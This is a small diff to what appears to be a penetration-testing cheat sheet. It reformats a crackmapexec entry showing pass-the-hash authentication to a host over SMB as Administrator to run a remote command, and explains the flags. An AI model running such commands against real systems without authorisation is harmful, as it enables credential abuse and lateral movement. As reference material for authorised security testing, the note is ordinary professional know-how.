@@ -190,9 +190,13 @@ Metasploit PsExec module
 ---
 
 #### crackmapexec
-`crackmapexec smb 10.2.34.3 -u Administrator -H "lm:ntlm" -x "ipconfig"`
-use hash to run a command
-
+```bash
+crackmapexec smb 10.2.34.3 -u Administrator -H "lm:ntlm" -x "ipconfig"
+```
+Use hash to connect over smb and run a command returning the output.
+- `-u` : username
+- `-H` : hash instead of password, usually just :ntlm
+- `-x` : command to run
 
 ---
 # Linux_Attacks
